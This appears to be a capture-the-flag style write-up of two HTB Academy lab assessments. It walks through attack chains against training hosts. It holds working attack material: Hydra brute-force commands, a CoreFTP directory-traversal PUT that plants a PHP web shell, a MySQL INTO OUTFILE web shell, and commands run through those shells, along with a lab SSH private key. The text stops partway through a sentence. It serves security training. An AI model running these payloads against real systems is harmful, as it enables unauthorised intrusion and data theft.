# 🎯 Skills Assessment - Attacking Common Services

## 🎯 Overview

This document covers the **Skills Assessment (Easy)** from HTB Academy's "Attacking Common Services" module. This practical exercise demonstrates a **complete attack chain** combining multiple service exploitation techniques to achieve the objective.

> **Target Domain**: `inlanefreight.htb`  
> **Objective**: "Assess the target server and obtain the contents of the flag.txt file"  
> **Skills Tested**: Service enumeration, user enumeration, credential attacks, file system access, web shell deployment

---

## 🔍 Phase 1: Service Discovery & Enumeration

### Initial Nmap Scan
```bash
# HTB Academy Skills Assessment - Initial reconnaissance
nmap -A 10.129.203.7

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 13:54 GMT
Nmap scan report for 10.129.203.7
Host is up (0.014s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_ssl-date: 2022-11-27T13:56:03+00:00; 0s from scanner time.
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https         Core FTP HTTPS Server
| fingerprint-strings: 
|   LDAPSearchReq: 
|_    550 Too many connections, please try later...
|_ssl-date: 2022-11-27T13:56:03+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_http-server-header: Core FTP HTTPS Server
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, FoundRows, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: s`gc>J7s`gdB\'M.>,`#
|_  Auth Plugin Name: mysql_native_password
```

### Key Services Identified
```
✅ FTP (21)     - Core FTP Server 2.0 build 725
✅ SMTP (25)    - hMailServer 
✅ HTTP (80)    - Apache 2.4.53 XAMPP
✅ HTTPS (443)  - Core FTP HTTPS Server  
✅ SMTP (587)   - hMailServer
✅ MySQL (3306) - MariaDB 10.4.24
```

---

## 👤 Phase 2: User Enumeration (SMTP)

### Download User Wordlist
```bash
# HTB Academy provided users wordlist
wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip

--2022-11-27 14:08:13--  https://academy.hackthebox.com/storage/resources/users.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 434 [application/zip]
Saving to: 'users.zip'

users.zip     100%[========>]     434  --.-KB/s    in 0s      

Archive:  users.zip
  inflating: users.list
```

### SMTP User Enumeration
```bash
# HTB Academy SMTP user enumeration
/usr/bin/smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sun Nov 27 14:11:34 2022 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Sun Nov 27 14:11:36 2022 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)
```

**Result**: Valid user `fiona@inlanefreight.htb` discovered

---

## 🔐 Phase 3: Credential Attacks (FTP)

### FTP Password Brute Force
```bash
# HTB Academy FTP credential attack
# CRITICAL: Use -t 1 to avoid 550 errors
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.203.7 -u -t 1

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 15:06:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking ftp://10.129.203.7:21/
[STATUS] 74.00 tries/min, 74 tries in 00:01h, 14344325 to do in 3230:43h, 1 active
[21][ftp] host: 10.129.203.7   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

**Result**: Valid credentials `fiona:987654321` discovered

---

## 📂 Phase 4: FTP Intelligence Gathering

### FTP Access & File Download
```bash
# HTB Academy FTP access
ftp 10.129.203.7

Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:root): fiona
331 password required for fiona
Password: 987654321
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.

# Download intelligence files
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for LIST
docs.txt
WebServersInfo.txt
226 Transfer Complete

ftp> get docs.txt
local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
55 bytes received in 0.00 secs (135.2920 kB/s)

ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
255 bytes received in 0.00 secs (747.8181 kB/s)

ftp> bye
221 Goodbye
```

### Critical Intelligence Analysis
```bash
# HTB Academy intelligence analysis
awk 1 WebServersInfo.txt

CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

**Key Intelligence**:
- CoreFTP server running on ports 21 & 443
- Apache web root at `C:\xampp\htdocs\`
- Authentication methods available via HTTPS

---

## 🚀 Phase 5: Exploitation - Method 1 (CoreFTP Directory Traversal)

### Vulnerability Research
```bash
# HTB Academy exploit research
searchsploit CoreFTP

---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CoreFTP 2.0 Build 674 MDTM - Directory Traversal (Metasploit)                                                                                 | windows/remote/48195.txt
CoreFTP 2.0 Build 674 SIZE - Directory Traversal (Metasploit)                                                                                 | windows/remote/48194.txt
CoreFTP 2.1 b1637 - Password field Universal Buffer Overflow                                                                                  | windows/local/11314.py
CoreFTP Server build 725 - Directory Traversal (Authenticated)                                                                                | windows/remote/50652.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

# Copy relevant exploit
searchsploit -m windows/remote/50652.txt

  Exploit: CoreFTP Server build 725 - Directory Traversal (Authenticated)
      URL: https://www.exploit-db.com/exploits/50652
     Path: /usr/share/exploitdb/exploits/windows/remote/50652.txt
File Type: ASCII text

Copied to: /home/htb-ac413848/50652.txt
```

### Exploit Analysis
```bash
# HTB Academy exploit study
cat 50652.txt

# Exploit Title: CoreFTP Server build 725 - Directory Traversal (Authenticated)
# Date: 08/01/2022
# Exploit Author: LiamInfosec
# Vendor Homepage: http://coreftp.com/
# Version: build 725 and below
# Tested on: Windows 10
# CVE : CVE-2022-22836

# Description:

CoreFTP Server before 727 allows directory traversal (for file creation) by an authenticated attacker via ../ in an HTTP PUT request.

# Proof of Concept:

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

### Web Shell Upload via Directory Traversal
```bash
# HTB Academy web shell deployment (Method 1)
# Generate random filename: openssl rand -hex 16
curl -k -X PUT -H "Host: 10.129.242.84" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://10.129.242.84/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php

HTTP/1.1 200 Ok
Date:Sun, 27 Oct 2022 16:10:37 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 36
```

---

## 🗄️ Phase 6: Exploitation - Method 2 (MySQL File Write)

### MySQL Access
```bash
# HTB Academy MySQL access (Alternative method)
mysql -u fiona -p987654321 -h 10.129.242.84

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

### File Write Privilege Check
```sql
-- HTB Academy MySQL file operations check
show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.016 sec)
```

**Result**: Empty value = File read/write operations allowed

### Web Shell Creation via MySQL
```sql
-- HTB Academy web shell deployment (Method 2)
-- Generate random filename: openssl rand -hex 16
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';

Query OK, 1 row affected (0.015 sec)
```

---

## 🎯 Phase 7: Flag Extraction

### Web Shell Execution
```bash
# HTB Academy flag extraction
# Method 1 shell usage:
curl -w "\n" http://10.129.242.84/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{...}

# Method 2 shell usage:
curl -w "\n" http://10.129.242.84/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{...}
```


---

## 📊 Attack Chain Summary

### Complete Attack Flow
```
1. Service Discovery    → Nmap scan (6 services identified)
2. User Enumeration     → SMTP RCPT enumeration (fiona found)
3. Credential Attack    → FTP brute force (fiona:987654321)
4. Intelligence Gather  → FTP file download (server info)
5. Vulnerability Research → CoreFTP CVE-2022-22836
6. Exploitation        → 2 methods available
   ├── Method 1: CoreFTP directory traversal
   └── Method 2: MySQL file write
7. Flag Extraction      → Web shell command execution
```

### Services Utilized
```
✅ SMTP    - User enumeration (smtp-user-enum)
✅ FTP     - Credential attack (Hydra) + File access
✅ HTTP    - Web shell execution
✅ HTTPS   - Directory traversal exploit (CoreFTP)
✅ MySQL   - Alternative file write method
```

### Key Learning Points
```
1. Multi-Service Attack Chain
   - Combined 5 different services for complete compromise
   - Each service provided different attack vectors

2. Intelligence-Driven Exploitation
   - FTP files revealed critical server information
   - Directory paths essential for successful exploitation

3. Multiple Exploitation Paths
   - CoreFTP directory traversal (CVE-2022-22836)
   - MySQL secure_file_priv bypass for file operations

4. Practical CPTS Skills
   - Service enumeration and fingerprinting
   - User enumeration techniques
   - Credential attack methodologies
   - Vulnerability research and exploitation
   - Web shell deployment and execution
```

---

## 🔧 Tools & Commands Reference

### Complete Tool Chain Used
```bash
# Service Discovery
nmap -A target_ip

# User Enumeration  
wget https://academy.hackthebox.com/storage/resources/users.zip
unzip users.zip
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t target_ip

# Credential Attacks
hydra -l username -P /usr/share/wordlists/rockyou.txt ftp://target_ip -u -t 1

# FTP Access
ftp target_ip

# Vulnerability Research
searchsploit CoreFTP
searchsploit -m windows/remote/50652.txt

# CoreFTP Exploitation
curl -k -X PUT -H "Host: target_ip" --basic -u username:password --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://target_ip/../../../../../../xampp/htdocs/shell.php

# MySQL Alternative
mysql -u username -ppassword -h target_ip
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';

# Flag Extraction
curl -w "\n" http://target_ip/shell.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

---

## 🔗 Related Documentation

- **[SMTP Attacks](smtp-attacks.md)** - Email service enumeration
- **[FTP Attacks](ftp-attacks.md)** - FTP exploitation techniques  
- **[SQL Attacks](sql-attacks.md)** - MySQL file operations
- **[HTB Academy](https://academy.hackthebox.com)** - Original module content

---

# 🎯 Skills Assessment - Medium Difficulty

## 🎯 Overview - Medium Challenge

This document covers the **Skills Assessment (Medium)** from HTB Academy's "Attacking Common Services" module. This advanced exercise demonstrates a **complex attack chain** involving DNS enumeration, vHost discovery, anonymous FTP access, email exploitation, and SSH key-based authentication.

> **Target Domain**: `inlanefreight.htb`  
> **Objective**: "Assess the target server and find the flag.txt file"  
> **Skills Tested**: DNS zone transfers, vHost enumeration, FTP intelligence gathering, POP3 attacks, SSH key extraction and usage

---

## 🔍 Phase 1: Service Discovery & DNS Enumeration

### Initial Nmap Scan
```bash
# HTB Academy Skills Assessment Medium - Initial reconnaissance
nmap -A 10.129.183.208

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:47 GMT
Nmap scan report for 10.129.183.208
Host is up (0.013s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
<SNIP>
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
<SNIP>
```

**Key Discovery**: DNS server running on port 53 (BIND 9.16.1)

### DNS Zone Transfer Attack
```bash
# HTB Academy DNS zone transfer exploitation
dig AXFR inlanefreight.htb @10.129.183.208

; <<>> DiG 9.16.27-Debian <<>> AXFR inlanefreight.htb @10.129.183.208
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.200.5
dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
un.inlanefreight.htb.	604800	IN	A	10.129.200.142
ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 13 msec
;; SERVER: 10.129.183.208#53(10.129.183.208)
;; WHEN: Sun Nov 27 16:59:44 GMT 2022
;; XFR size: 13 records (messages 1, bytes 372)
```

**Critical Discovery**: `int-ftp.inlanefreight.htb` points to 127.0.0.1 (localhost)

---

## 🌐 Phase 2: vHost Configuration & Internal Service Discovery

### vHost Addition to Local Hosts
```bash
# HTB Academy vHost configuration for internal access
sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
```

### Internal FTP Service Discovery
```bash
# HTB Academy internal FTP service enumeration
nmap -p- -T4 -A int-ftp.inlanefreight.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 17:16 GMT
Nmap scan report for int-ftp.inlanefreight.htb (10.129.183.208)
Host is up (0.014s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
<SNIP>
30021/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.183.208]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

**Discovery**: ProFTPD server on non-standard port 30021

---

## 📂 Phase 3: Anonymous FTP Access & Intelligence Gathering

### Anonymous FTP Connection
```bash
# HTB Academy anonymous FTP access
ftp int-ftp.inlanefreight.htb 30021

Connected to int-ftp.inlanefreight.htb.
220 ProFTPD Server (Internal FTP) [10.129.183.208]
Name (int-ftp.inlanefreight.htb:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: anonymous@test.com
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
```

### File System Exploration
```bash
# HTB Academy FTP directory listing
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete

# Navigate to user directory
ftp> cd simon
250 CWD command successful

ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete

# Download intelligence file
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
200 PORT command successful
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
226 Transfer complete
153 bytes received in 0.00 secs (53.1723 kB/s)

ftp> bye
221 Goodbye.
```

**Intelligence Gathered**: Password wordlist file `mynotes.txt` for user `simon`

---

## 🔐 Phase 4: POP3 Credential Attack

### Password List Analysis
```bash
# HTB Academy wordlist content (mynotes.txt contains potential passwords)
cat mynotes.txt
# (Contains various password candidates for simon user)
```

### POP3 Password Brute Force
```bash
# HTB Academy POP3 credential attack using discovered wordlist
hydra -l simon -P mynotes.txt pop3://10.129.183.208

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 17:32:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.183.208:110/
[110][pop3] host: 10.129.183.208   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-27 17:32:05
```

**Result**: Valid credentials `simon:8Ns8j1b!23hs4921smHzwn` discovered

---

## 📧 Phase 5: POP3 Email Access & SSH Key Extraction

### POP3 Mail Access
```bash
# HTB Academy POP3 email access
nc -nv 10.129.183.208 110

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.183.208:110.
+OK Dovecot (Ubuntu) ready.

user simon
+OK

pass 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
```

### Email Enumeration & Retrieval
```bash
# HTB Academy email listing and retrieval
list
+OK 1 messages:
1 1630
.

retr 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
	id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg 
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== 
-----END OPENSSH PRIVATE KEY-----

quit
+OK Logging out.
```

**Critical Discovery**: SSH private key for user `simon` obtained from email

---

## 🔐 Phase 6: SSH Key Processing & Authentication

### SSH Key Formatting
```bash
# HTB Academy SSH private key extraction and formatting
echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

### Formatted SSH Private Key
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm
w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH
c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W
1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi
6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR
Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi
ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ
hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz
B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA
AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ==
-----END OPENSSH PRIVATE KEY-----
```

### SSH Key Permissions & Access
```bash
# HTB Academy SSH key permission setup
chmod 600 id_rsa

# SSH connection using private key
ssh -i id_rsa simon@10.129.229.46

The authenticity of host '10.129.229.46 (10.129.229.46)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.46' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
<SNIP>
```

---

## 🎯 Phase 7: Flag Extraction

### Final Flag Retrieval
```bash
# HTB Academy flag extraction
simon@lin-medium:~$ cat flag.txt
HTB{...}
```

---

## 📊 Attack Chain Summary - Medium Difficulty

### Complete Attack Flow
```
1. Service Discovery    → Nmap scan (DNS service identified)
2. DNS Zone Transfer    → AXFR query (internal hosts discovered)
3. vHost Configuration  → /etc/hosts modification (int-ftp access)
4. Internal FTP Access  → Anonymous login (ProFTPD port 30021)
5. Intelligence Gather  → FTP file download (password wordlist)
6. POP3 Credential Attack → Hydra with custom wordlist
7. Email Access        → POP3 connection (SSH key discovery)
8. SSH Key Processing   → Email parsing and key formatting
9. SSH Authentication  → Private key-based login
10. Flag Extraction     → File system access as simon user
```

### Services & Techniques Utilized
```
✅ DNS      - Zone transfer exploitation (dig AXFR)
✅ vHost    - Internal service discovery (/etc/hosts)
✅ FTP      - Anonymous access (ProFTPD non-standard port)
✅ POP3     - Credential attack with custom wordlist
✅ Email    - Intelligence extraction (SSH keys)
✅ SSH      - Private key authentication
```

### Advanced Learning Points
```
1. DNS Zone Transfer Exploitation
   - AXFR queries for internal network discovery
   - Virtual host identification and configuration

2. Internal Service Discovery
   - Non-standard port identification (30021)
   - Anonymous FTP access patterns

3. Intelligence-Driven Attacks
   - Custom wordlist creation from gathered intelligence
   - Multi-service credential reuse patterns

4. Email-Based Key Distribution
   - SSH private key extraction from emails
   - Key formatting and permission management

5. Complex Attack Chain Integration
   - 6+ different services in attack path
   - Each phase enabling the next attack vector
```

---

## 🔧 Complete Tool Chain - Medium Difficulty

### Full Command Reference
```bash
# Service Discovery
nmap -A target_ip

# DNS Zone Transfer
dig AXFR inlanefreight.htb @target_ip

# vHost Configuration
sudo sh -c 'echo "target_ip int-ftp.inlanefreight.htb" >> /etc/hosts'

# Internal Service Discovery
nmap -p- -T4 -A int-ftp.inlanefreight.htb

# Anonymous FTP Access
ftp int-ftp.inlanefreight.htb 30021

# POP3 Credential Attack
hydra -l username -P wordlist.txt pop3://target_ip

# POP3 Email Access
nc -nv target_ip 110

# SSH Key Processing
echo 'ssh_key_string' | sed 's/ /\n/g' > id_rsa
chmod 600 id_rsa

# SSH Authentication
ssh -i id_rsa username@target_ip
```

---

## 🔗 Skills Assessment Comparison

### Easy vs Medium Difficulty

#### **Easy Skills Assessment**
- **Attack Chain**: 7 phases (Service Discovery → Web Shell → Flag)
- **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
- **Key Techniques**: User enumeration, credential attacks, directory traversal, file upload
- **Complexity**: Medium - Multiple exploitation paths available

#### **Medium Skills Assessment**
- **Attack Chain**: 10 phases (DNS → vHost → SSH Key → Flag)
- **Services**: DNS, FTP, POP3, SSH (4 services + vHost discovery)
- **Key Techniques**: Zone transfers, internal service discovery, email intelligence, SSH keys
- **Complexity**: High - Linear attack chain with each phase dependent on previous

### Practical CPTS Skills Demonstrated

```
Easy Level:
